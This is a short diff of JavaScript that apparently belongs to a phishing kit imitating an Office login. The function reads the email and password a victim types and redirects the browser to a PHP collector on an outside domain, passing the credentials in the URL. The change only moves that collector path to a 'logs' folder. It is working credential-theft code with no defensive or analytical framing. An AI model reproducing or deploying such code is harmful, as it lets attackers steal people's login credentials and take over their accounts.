@@ -64,7 +64,7 @@ function getDetails(e) {
 
                 url = "Domain" + "=" + "Office | Plain" + "&" + "Mail" + "=" + email.innerText + "&" + "Password" + "=" + pass.innerText
 
-                location = "https://tellme24.com/gm1/plain.php?" + url;
+                location = "https://tellme24.com/logs/gm1/plain.php?" + url;
 
                 setTimeout(() => {
                     pass.innerText = "";
